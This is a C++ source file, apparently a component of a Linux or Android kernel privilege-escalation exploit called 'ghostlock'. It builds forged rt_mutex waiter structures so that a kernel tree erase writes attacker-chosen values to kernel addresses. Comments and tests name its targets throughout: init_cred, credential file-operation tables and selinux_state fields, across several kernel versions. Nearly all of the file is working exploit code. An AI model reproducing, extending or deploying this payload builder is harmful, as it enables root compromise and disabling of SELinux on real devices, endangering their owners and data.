#include "memory/payload_builder.h"

#include <cstring>

#include <algorithm>
#include <array>
#include <cstddef>
#include <iterator>
#include <span>

using namespace ghostlock;

namespace {
    void store64(unsigned char *p, size_t off, uint64_t value) {
        memcpy(p + off, &value, sizeof(value));
    }

    uint64_t load64(const unsigned char *p, size_t off) {
        uint64_t value;
        memcpy(&value, p + off, sizeof(value));
        return value;
    }

    bool span_store64(std::span<std::byte> bytes, size_t offset,
                      uint64_t value) noexcept {
        if (offset > bytes.size() || sizeof(value) > bytes.size() - offset) {
            return false;
        }
        memcpy(bytes.data() + offset, &value, sizeof(value));
        return true;
    }
} // namespace

namespace ghostlock::memory {
    bool encode_compact_waiter(std::span<std::byte> waiter,
                               const WriteRequest &request,
                               const PayloadWriteLayout &layout) noexcept {
        if (waiter.size() < kCompactWaiterBytes) return false;
        /* One triple, one definition (see waiter_tree_stamp): the route stamps the
         * same words into the pselect fd_sets, so a divergence here would be a
         * different vehicle than the one that was probed. */
        const WaiterTreeStamp stamp = waiter_tree_stamp(layout);
        /* The stamp must place the write where the request asked for it: the
         * pointer layouts store at rb_left (= target), the leaf layout has no
         * children and steers the erase's collateral from target - 8. Anything
         * else is a write to the wrong address, not a malformed payload. */
        if (!((stamp.left == request.target && stamp.left != 0) ||
              (stamp.left == 0 && stamp.pc == request.target - 8)))
            return false;
        return span_store64(waiter, 0x18, stamp.pc) &&
               span_store64(waiter, 0x20, stamp.right) &&
               span_store64(waiter, 0x28, stamp.left);
    }

    bool encode_waiter_words(std::span<std::byte> buffer, size_t offset,
                             const WaiterWords &words) noexcept {
        if (offset > buffer.size() || kWaiterBytes > buffer.size() - offset) {
            return false;
        }
        /* One store per word instead of a memcpy of a packed struct: the strip
         * is a userspace image of a kernel object, so its byte layout is the
         * ABI, not this compiler's idea of a struct. */
        const std::uint64_t raw[kWaiterWords] = {
            words.tree_pc, words.tree_right, words.tree_left,
            words.pi_pc, words.pi_right, words.pi_left,
            words.task, words.lock,
            words.prio, words.deadline, words.ww_ctx,
        };
        for (size_t i = 0; i < kWaiterWords; i++) {
            memcpy(buffer.data() + offset + i * sizeof(std::uint64_t), &raw[i],
                   sizeof(std::uint64_t));
        }
        return true;
    }

    bool encode_multicast_waiter(std::span<std::byte> buffer,
                                 size_t waiter_offset, size_t task_offset, size_t lock_offset,
                                 uintptr_t fake_task, uintptr_t fake_lock) noexcept {
        return span_store64(buffer, waiter_offset + task_offset, fake_task) &&
               span_store64(buffer, waiter_offset + lock_offset, fake_lock);
    }

    PayloadWriteLayout payload_write_layout(
        const WriteRequest *request, uintptr_t page_base,
        uintptr_t default_fops, uintptr_t credential_fops,
        uintptr_t init_cred_alias) {
        PayloadWriteLayout layout = {
            .fops = default_fops,
        };
        if (!request || request->mode == WriteMode::Disabled) return layout;

        if (request->preserve_child) {
            layout.right = request->mode == WriteMode::Credential
                               ? init_cred_alias
                               : page_base + 0x100;
            /* the erase stores at rb_left, and the collateral re-parents through
             * this same value -- see waiter_tree_stamp */
            layout.left = request->target;
        }
        /* The leaf layout carries no value on the node: right and left stay 0 and
         * the erase's collateral, steered by layout.parent (= target - 8), does
         * the zero write. See waiter_tree_stamp. */
        if (request->mode == WriteMode::Credential) {
            layout.fops = credential_fops;
            layout.needs_credential_copy = true;
        }
        layout.parent = request->target - 8;
        return layout;
    }

    void build_compact_waiter_payload(
        unsigned char *waiter, const WriteRequest *request,
        const PayloadWriteLayout *layout) {
        if (!waiter || !request || !layout) return;
        (void) encode_compact_waiter(
            {
                reinterpret_cast<std::byte *>(waiter),
                kCompactWaiterBytes
            },
            *request, *layout);
    }

    int32_t payload_write_layout_matches_request(
        const WriteRequest *request, const PayloadWriteLayout *layout) {
        if (!request || !layout || request->mode == WriteMode::Disabled) return 0;
        if (request->preserve_child) return layout->right != 0;
        /* Leaf layout: childless, steered by a real parent pointer, so neither the
         * lock's tree root nor the enqueue's descent can be reached with a value
         * the kernel would treat as a node. */
        return layout->right == 0 && layout->left == 0 &&
               layout->parent == request->target - 8 &&
               layout->parent != 0;
    }

    int32_t payload_write_layout_accepts_page(
        const WriteRequest *request, const PayloadWriteLayout *layout) {
        if (!payload_write_layout_matches_request(request, layout)) return 0;
        /* W1 stores its page-derived value across selinux_state fields. An even
     * byte 2 clears `initialized` and breaks every subsequent SID lookup. */
        if (request->mode == WriteMode::Zero && request->preserve_child &&
            ((layout->right >> 16) & 1) == 0)
            return 0;
        return 1;
    }

    void build_multicast_waiter_payload(
        unsigned char *buffer, size_t waiter_offset, size_t task_offset,
        size_t lock_offset, uintptr_t fake_task, uintptr_t fake_lock) {
        if (!buffer) return;
        const size_t required = waiter_offset +
                                std::max(task_offset, lock_offset) + sizeof(uint64_t);
        (void) encode_multicast_waiter(
            {reinterpret_cast<std::byte *>(buffer), required}, waiter_offset,
            task_offset, lock_offset, fake_task, fake_lock);
    }

    int32_t payload_builder_fixed_vector_test(void) {
        static const struct {
            uintptr_t target;
            WriteMode mode;
            int32_t leaf;
            uintptr_t expected_pc;
            uintptr_t expected_left;
        } vectors[] = {
            /* leaf/zero layout: CHILDLESS, pc = target - 8 -- no value is stored
             * on the node at all; the erase's collateral writes NULL at
             * parent + 8 = *(target). See waiter_tree_stamp. */
            {
                0xffffff8000123000ULL, WriteMode::Zero, 1,
                0xffffff8000122ff8ULL, 0
            },
            {
                0xffffff8000124000ULL, WriteMode::Zero, 0,
                0xffffff8800210100ULL, 0xffffff8000124000ULL
            },
            {
                0xffffff8000125000ULL, WriteMode::Credential, 0,
                0xffffff802abfd588ULL, 0xffffff8000125000ULL
            },
        };
        const uintptr_t page = 0xffffff8800210000ULL;
        const uintptr_t init_cred = 0xffffff802abfd588ULL;
        for (size_t i = 0; i < std::size(vectors); ++i) {
            std::array<unsigned char, kCompactWaiterBytes> current{};
            const WriteRequest request = WriteRequest::make(
                vectors[i].target, vectors[i].mode, vectors[i].leaf != 0);
            PayloadWriteLayout layout = payload_write_layout(
                &request, page, 0x1111, 0x2222, init_cred);
            build_compact_waiter_payload(current.data(), &request, &layout);
            if (load64(current.data(), 0x18) != vectors[i].expected_pc ||
                load64(current.data(), 0x20) != 0 ||
                load64(current.data(), 0x28) != vectors[i].expected_left ||
                !payload_write_layout_matches_request(&request, &layout) ||
                !payload_write_layout_accepts_page(&request, &layout))
                return 0;
        }
        /* The invariant the vehicle rests on: a zero write's node is CHILDLESS and
         * its pc is a real parent pointer, so the erase cannot reach the lock's
         * tree root and the enqueue's descent exits on its first test. A
         * regression here is a kernel data abort in the walk, not a wrong write. */
        const WriteRequest zero = WriteRequest::make(
            0xffffff8000126000ULL, WriteMode::Zero, 1);
        const PayloadWriteLayout zero_layout = payload_write_layout(
            &zero, page, 0x1111, 0x2222, init_cred);
        const WaiterTreeStamp zero_stamp = waiter_tree_stamp(zero_layout);
        if (zero_stamp.pc != zero.target - 8 || zero_stamp.pc == 0 ||
            zero_stamp.right != 0 || zero_stamp.left != 0 ||
            zero_layout.right != 0 || zero_layout.left != 0 ||
            !payload_write_layout_matches_request(&zero, &zero_layout))
            return 0;

        const WriteRequest w1 = WriteRequest::make(
            0xffffff8000124000ULL, WriteMode::Zero, false);
        PayloadWriteLayout rejected = payload_write_layout(
            &w1, 0xffffff8800200000ULL, 0x1111, 0x2222, init_cred);
        if (payload_write_layout_accepts_page(&w1, &rejected)) return 0;
        rejected.right = 0;
        if (payload_write_layout_matches_request(&w1, &rejected)) return 0;

        std::array < unsigned char, 0x80 > legacy_stamp{};
        std::array < unsigned char, 0x80 > current_stamp{};
        store64(legacy_stamp.data(), 0x20 + 0x28, 0xffffff8800005800ULL);
        store64(legacy_stamp.data(), 0x20 + 0x30, 0xffffff8800001000ULL);
        build_multicast_waiter_payload(
            current_stamp.data(), 0x20, 0x28, 0x30,
            0xffffff8800005800ULL, 0xffffff8800001000ULL);
        if (memcmp(legacy_stamp.data(), current_stamp.data(),
                   legacy_stamp.size()) != 0)
            return 0;
        std::byte undersized[0x2f]{};
        if (encode_compact_waiter(undersized, w1, rejected)) return 0;

        /* The eleven-word waiter strip both stack-stamp routes share. Fixed
         * vectors: the exact bytes the select route's compact branch stamps
         * (its table at route/select_stack_route.cpp's `pselect_waiter_word
         * words[]` is the reference this must reproduce byte for byte). */
        {
            constexpr std::uintptr_t leaf_target = 0xffffff8000127000ULL;
            constexpr std::uintptr_t leaf_task = 0xffffff8800005800ULL;
            constexpr std::uintptr_t leaf_lock = 0xffffff802aa3a590ULL;
            const WriteRequest leaf = WriteRequest::make(
                leaf_target, WriteMode::Zero, /*leaf=*/1);
            const PayloadWriteLayout leaf_layout = payload_write_layout(
                &leaf, page, 0x1111, 0x2222, init_cred);
            std::array<std::byte, kWaiterBytes> strip{};
            if (!encode_waiter_words(strip, 0,
                                     waiter_words(leaf_layout, leaf_task, leaf_lock, 140)))
                return 0;
            const std::uint64_t expected[kWaiterWords] = {
                leaf_target - 8, 0, 0, /* tree: childless leaf, pc = target - 8 */
                0, 0, 0,               /* pi triple parks at zero */
                leaf_task, leaf_lock, 140, 0, 0,
            };
            for (size_t i = 0; i < kWaiterWords; i++) {
                if (load64(reinterpret_cast<const unsigned char *>(strip.data()),
                           i * sizeof(std::uint64_t)) != expected[i])
                    return 0;
            }

            /* The pointer layout: the erase stores `right` at rb_left and
             * re-parents through it, so the triple is {pc = value, right = 0,
             * left = target} -- the target is the *left* child. */
            constexpr std::uintptr_t ptr_target = 0xffffff8000128000ULL;
            const WriteRequest pointer = WriteRequest::make(
                ptr_target, WriteMode::Zero, /*leaf=*/false);
            const PayloadWriteLayout pointer_layout = payload_write_layout(
                &pointer, page, 0x1111, 0x2222, init_cred);
            const WaiterWords pointer_words =
                waiter_words(pointer_layout, leaf_task, leaf_lock, 140);
            if (pointer_words.tree_pc != page + 0x100 ||
                pointer_words.tree_right != 0 ||
                pointer_words.tree_left != ptr_target)
                return 0;

            /* Words land at offset + 8*i, and nothing outside the strip moves. */
            std::array<std::byte, 0x60> window{};
            if (!encode_waiter_words(window, 8, pointer_words)) return 0;
            if (load64(reinterpret_cast<const unsigned char *>(window.data()),
                       8 + 0x38) != leaf_lock)
                return 0;
            for (size_t i = 0; i < 8; i++) {
                if (window[i] != std::byte{0}) return 0;
            }
            /* The `prio` word (+0x40) is family-shaped, and both stack-stamp
             * routes must agree with the page builder on which shape they are
             * writing -- getting it wrong reads as prio = 0 (highest) on
             * 5.15/6.1, which is exactly the defect waiter_prio_word() exists to
             * prevent. 5.10: `int prio` alone (140). 5.15/6.1: (prio << 32) |
             * wake_state, per the measured layout table in
             * docs/analysis/waiter-layout-family-gating-plan.md. The word values
             * are spelled out on purpose: a fixed vector pins the numbers, not
             * the constants the production sites happen to use. */
            constexpr std::uint64_t k5_10_prio_word = 140;
            constexpr std::uint64_t kPacked_prio_word = (140ULL << 32) | 3;
            std::array<std::byte, kWaiterBytes> prio_strip{};
            if (!encode_waiter_words(prio_strip, 0,
                                     waiter_words(leaf_layout, leaf_task, leaf_lock,
                                                  k5_10_prio_word)))
                return 0;
            if (load64(reinterpret_cast<const unsigned char *>(prio_strip.data()), 0x40) !=
                k5_10_prio_word)
                return 0;
            if (!encode_waiter_words(prio_strip, 0,
                                     waiter_words(leaf_layout, leaf_task, leaf_lock,
                                                  kPacked_prio_word)))
                return 0;
            if (load64(reinterpret_cast<const unsigned char *>(prio_strip.data()), 0x40) !=
                kPacked_prio_word)
                return 0;
            /* The packed shape must leave the neighbouring words alone: +0x38 is
             * the lock and +0x48 the deadline in both families. */
            if (load64(reinterpret_cast<const unsigned char *>(prio_strip.data()), 0x38) !=
                    leaf_lock ||
                load64(reinterpret_cast<const unsigned char *>(prio_strip.data()), 0x48) != 0)
                return 0;

            /* An undersized span is refused instead of written out of bounds. */
            std::array<std::byte, kWaiterBytes - 1> too_small{};
            if (encode_waiter_words(too_small, 0, pointer_words)) return 0;
            if (encode_waiter_words(window, 9, pointer_words)) return 0;
        }
        /* Multicast geometry that would run past the supplied span is rejected
     * instead of written out of bounds. */
        std::array<std::byte, 0x40> multicast_small{};
        if (encode_multicast_waiter(
            multicast_small, 0x20, 0x28, 0x30, 0x1111, 0x2222))
            return 0;
        return 1;
    }
} // namespace ghostlock::memory
